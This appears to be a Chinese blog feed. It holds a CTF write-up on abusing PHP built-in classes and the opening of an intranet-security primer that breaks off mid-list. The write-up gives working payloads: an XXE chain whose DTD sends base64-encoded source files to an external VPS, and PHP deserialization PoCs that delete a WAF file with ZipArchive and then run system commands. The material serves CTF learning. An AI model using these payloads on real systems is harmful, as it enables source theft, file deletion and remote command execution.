返回反射方法对象的字符串表达*/ReflectionMethod extends ReflectionFunctionAbstract implements Reflector &#123;/* 常量 */const integer IS_STATIC = 1 ;const integer IS_PUBLIC = 256 ;const integer IS_PROTECTED = 512 ;const integer IS_PRIVATE = 1024 ;const integer IS_ABSTRACT = 2 ;const integer IS_FINAL = 4 ;/* 属性 */public $name ;public $class ;/* 方法 */public __construct ( mixed $class , string $name )public static export ( string $class , string $name [, bool $return = false ] ) : stringpublic getClosure ( object $object ) : Closurepublic getDeclaringClass ( ) : ReflectionClasspublic getModifiers ( ) : intpublic getPrototype ( ) : ReflectionMethodpublic invoke ( object $object [, mixed $parameter [, mixed $... ]] ) : mixedpublic invokeArgs ( object $object , array $args ) : mixedpublic isAbstract ( ) : boolpublic isConstructor ( ) : boolpublic isDestructor ( ) : boolpublic isFinal ( ) : boolpublic isPrivate ( ) : boolpublic isProtected ( ) : boolpublic isPublic ( ) : boolpublic isStatic ( ) : boolpublic setAccessible ( bool $accessible ) : voidpublic __toString ( ) : string/* 继承的方法 */final private ReflectionFunctionAbstract::__clone ( ) : voidpublic ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClasspublic ReflectionFunctionAbstract::getClosureThis ( ) : objectpublic ReflectionFunctionAbstract::getDocComment ( ) : stringpublic ReflectionFunctionAbstract::getEndLine ( ) : intpublic ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtensionpublic ReflectionFunctionAbstract::getExtensionName ( ) : stringpublic ReflectionFunctionAbstract::getFileName ( ) : stringpublic ReflectionFunctionAbstract::getName ( ) : stringpublic ReflectionFunctionAbstract::getNamespaceName ( ) : stringpublic ReflectionFunctionAbstract::getNumberOfParameters ( ) : intpublic ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : intpublic ReflectionFunctionAbstract::getParameters ( ) : arraypublic ReflectionFunctionAbstract::getReturnType ( ) : ReflectionTypepublic ReflectionFunctionAbstract::getShortName ( ) : stringpublic ReflectionFunctionAbstract::getStartLine ( ) : intpublic ReflectionFunctionAbstract::getStaticVariables ( ) : arraypublic ReflectionFunctionAbstract::hasReturnType ( ) : boolpublic ReflectionFunctionAbstract::inNamespace ( ) : boolpublic ReflectionFunctionAbstract::isClosure ( ) : boolpublic ReflectionFunctionAbstract::isDeprecated ( ) : boolpublic ReflectionFunctionAbstract::isGenerator ( ) : boolpublic ReflectionFunctionAbstract::isInternal ( ) : boolpublic ReflectionFunctionAbstract::isUserDefined ( ) : boolpublic ReflectionFunctionAbstract::isVariadic ( ) : boolpublic ReflectionFunctionAbstract::returnsReference ( ) : boolabstract public ReflectionFunctionAbstract::__toString ( ) : void&#125;</code></pre><h2 id="第十四届全国信息安全竞赛-easy-resource"><a href="#第十四届全国信息安全竞赛-easy-resource" class="headerlink" title="[第十四届全国信息安全竞赛]easy_resource"></a>[第十四届全国信息安全竞赛]easy_resource</h2><p><strong>目录扫描可获得源码:</strong></p><pre><code class="php">&lt;?phpclass User&#123;    private static $c = 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>可利用原生的反射类进行读取，题目说在看不到的地方，猜测是在注释的地方<br>可构造payload:</p><pre><code class="php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></pre><p>翻译一下就是:</p><pre><code class="php">$method = new ReflectionMethod(User,a);var_dump($method-&gt;getDocComment); //getDocComment获取文档注释</code></pre><p>由于不知道是在哪个方法内，所以可以进行遍历<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="img"></p><h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p> SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。  </p><h2 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h2><p> 官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="img"><br>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。<br>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p><h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>随便注册一个账户发现如下源码<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="img"></p><pre><code class="php">&lt;?php class calc&#123;    function __construct__()&#123;        calc();    &#125;    function calc($args1,$method,$args2)&#123;        $args1=intval($args1);        $args2=intval($args2);        switch ($method) &#123;            case &#39;a&#39;:                $method=&quot;+&quot;;                break;            case &#39;b&#39;:                $method=&quot;-&quot;;                break;            case &#39;c&#39;:                $method=&quot;*&quot;;                break;            case &#39;d&#39;:                $method=&quot;/&quot;;                break;                        default:                die(&quot;invalid input&quot;);        &#125;        $Expression=$args1.$method.$args2;        eval(&quot;\$r=$Expression;&quot;);        die(&quot;Calculation results:&quot;.$r);    &#125;&#125;?&gt;        </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="img"><br>我们可以利用SimpleXMLElement类<br>我们构造的xml如下:<br>test.xml</p><pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM &quot;http://108.166.201.16:8000/evil.dtd&quot;&gt;%int;%all;%send;]&gt;</code></pre><p>evil.dtd</p><pre><code class="php">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://108.166.201.16:5555/?%payl;&#39;&gt;&quot;&gt;</code></pre><p>在vps上放上这两个文件<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="img"><br>然后再使用vps监听5555端口<br>最终构造payload</p><pre><code class="php">http://16c35a6e-0285-4dc1-9c3d-2acf598489fc.node4.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://108.166.201.16:8000/test.xml&amp;args[]=2&amp;args[]=true</code></pre><p>我们可以看到接受到了数据，base64解码即可<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="img"><br>同理可获得其他页面源码</p><h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><h2 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h2><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。<br>下面列举几个常见的类方法：</p><ul><li><a href="https://www.php.net/manual/zh/ziparchive.addemptydir.php">ZipArchive::addEmptyDir</a>：添加一个新的文件目录</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfile.php">ZipArchive::addFile</a>：将文件添加到指定zip压缩包中</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfromstring.php">ZipArchive::addFromString</a>：添加新的文件同时将内容添加进去</li><li><a href="https://www.php.net/manual/zh/ziparchive.close.php">ZipArchive::close</a>：关闭ziparchive</li><li><a href="https://www.php.net/manual/zh/ziparchive.extractto.php">ZipArchive::extractTo</a>：将压缩包解压</li><li><a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>：打开一个zip压缩包</li><li><a href="https://www.php.net/manual/zh/ziparchive.deleteindex.php">ZipArchive::deleteIndex</a>：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件</li><li><a href="https://www.php.net/manual/zh/ziparchive.deletename.php">ZipArchive::deleteName</a>：删除压缩包中的某一个文件名称，同时也将文件删除</li><li>……</li></ul><p>我们来重点看看 ZipArchive::open 方法：</p><pre><code class="php">ZipArchive::open(string $filename, int $flags=0)</code></pre><p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p><ul><li>filename：要打开的ZIP存档的文件名。</li><li>flags：用于打开档案的模式。有以下几种模式： <ul><li>ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li><li>ZipArchive::CREATE：如果不存在则创建一个zip压缩包。</li><li>ZipArchive::RDONLY：只读模式打开压缩包。</li><li>ZipArchive::EXCL：如果压缩包已经存在，则出错。</li><li>ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。</li></ul></li></ul><p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。<br>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。</p><h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><p>源码下载:<a href="https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip">https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip</a></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#39;shell.php&#39;);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;        public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;class login&#123;    public $file;    public $filename;    public $content;    public function __construct($file,$filename,$content)    &#123;        $this-&gt;file=$file;        $this-&gt;filename=$filename;        $this-&gt;content=$content;    &#125;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);            die(&#39;login success you can to open shell file!&#39;);        &#125;    &#125;&#125;class register&#123;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            die(&#39;success register admin&#39;);        &#125;else&#123;            die(&#39;please register admin &#39;);        &#125;    &#125;&#125;class Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#39;waf.txt&#39;))&#123;            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);        &#125;    &#125;&#125;if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;])))&#123;    @unserialize(base64_decode($_POST[&#39;unser&#39;]));&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="img"><br>这里反序列化前有个校验，直接使用数组绕过</p><pre><code class="php">http://127.0.0.1/test/?a[]=1&amp;b[]=2</code></pre><p>读取下shell.php的内容<br>构造payload:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;whoami&#39;;$a-&gt;filename = &#39;php://filter/read=convert.base64-encode/resource=shell&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>解码得到shell.php的源码:</p><pre><code class="php">&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#39;so long!&#39;);     &#125;&#125;</code></pre><p>shell.php可以执行系统命令<br>但是如果要执行shell.php<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="img"><br>必须不存在这个文件，那么我们就要想办法把它删除<br>我们必须要使用原生类，这个原生类还必须是open方法可以删除文件<br>遍历一下:</p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;open&#39;        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="img"><br>ZipArchive刚好有个open方法可以满足,上文已经介绍过了<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="img"><br>传入8相当于重写文件<br>最终构造poc:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = 8;$a-&gt;filename = &#39;waf.txt&#39;;$a-&gt;file = new ZipArchive();echo base64_encode(serialize($a));</code></pre><pre><code class="php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</code></pre><p>传入后waf.txt就被删除，我这里是本地搭建的环境所以直接可以看到<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="img"><br>接下来构造poc执行命令即可:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;type flag&#39;;$a-&gt;filename = &#39;111&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>我这里是用windows系统复现的，所以使用命令不同，思路都一样<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="img"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/rawrecruit/article/details/123968687">https://blog.csdn.net/rawrecruit/article/details/123968687</a><br><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a><br><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;查看各方法内置类&quot;&gt;&lt;a href=&quot;#查看各方法内置类&quot; class=&quot;headerlink&quot; title=&quot;查看各方法内置类&quot;&gt;&lt;/a&gt;查看各方法内置类&lt;/h1&gt;&lt;p&gt; 通过这段代码查看方法的类，这里看到__toString方法对应的Error类  &lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="php" scheme="https://sakurahack-y.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>内网学习篇</title>
    <link href="https://sakurahack-y.github.io/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/"/>
    <id>https://sakurahack-y.github.io/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/</id>
    <published>2022-07-13T06:56:01.000Z</published>
    <updated>2022-07-14T00:55:13.117Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="内网安全第一章"><a href="#内网安全第一章" class="headerlink" title="内网安全第一章"></a>内网安全第一章</h1><h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h2><p><strong>工作组</strong>:工作组（ Work Group)，在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居)”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能(或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628095849118.png" alt="image-20220628095849118"></p><p><strong>域</strong>(Domain)是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。<br><strong>域控制器</strong>（Domain Controller，简写为Dc）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100052625.png" alt="image-20220628100052625"></p><p><strong>域的分类:</strong></p><p><strong>单域</strong><br>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。·一般在一个域内要建立至少两个域服务器，一个作为Dc，一个是备份DC。如果没有第二个备份Dc，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息)是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的Dc恢复了就行了。</p><p><strong>父域</strong></p><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。<br>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。<br>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。(因为在同一个域内，信息交互的条目是很多的，而且不压缩;而在域和域之间，信息交互的条目相对较少，而且压缩。）<br>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略(包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p><p><strong>域树</strong></p><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系(Trust Relation)。<br>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100413944.png" alt="image-20220628100413944"></p><p><strong>域森林</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100503104.png" alt="image-20220628100503104"></p><p><strong>DNS域名服务器</strong>是进行域名(domain name)和与之相对应的IP地址(IPaddress)转换的服务器。<br>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。<br>一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p><p><strong>活动目录</strong>（Active Directory）是域环境中提供目录服务的组件。目录是什么?目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。<br>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p><p><strong>逻辑结构</strong></p><p>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构”。<br>活动目录的逻辑结构就包括上面讲到的组织单元（ou)、域(domain)、域树( tree)、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628102316204.png" alt="image-20220628102316204"></p><p><strong>活动目录主要功能</strong></p><p>帐号集中管理，所有帐号均存在服务器上,方便对帐号的重命令/重置密码。<br>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。<br>环境集中管理，利用AD可以统一客户端桌面,IE,TCP/IP等设置。<br>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。更可靠，更少的宕机时间。如:利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间 少。活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服务都依赖于这个基础平台。</p><p><strong>AD和DC区别</strong></p><p>如果网络规模较大，我们就会考虑把网络中的众多对象:计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。那么我们应该把这个数据库放在哪台计算机上呢?规定是这样的，我们把存放有活动目录数据库的计算机就称为Dc。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p><p><strong>安全域的划分</strong></p><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL(网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域;允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><strong>DMZ</strong></p><p>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。<br>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。<br>另一方面，通过这样一个DMz区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628103312842.png" alt="image-20220628103312842"></p><p><strong>DMZ屏障功能</strong></p><p>(1) 内网可以访问外网<br>内网的角户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</p><p>(2) 内网可以访问DMZ<br>此策略使内网用户可以使用或者管理DMZ中的服务器。</p><p>(3) 外网不能访问内网<br>这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果耍访问，就要通过VPN方式来进行。</p><p>(4) 外网可以访问DMZ<br>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</p><p>(5) 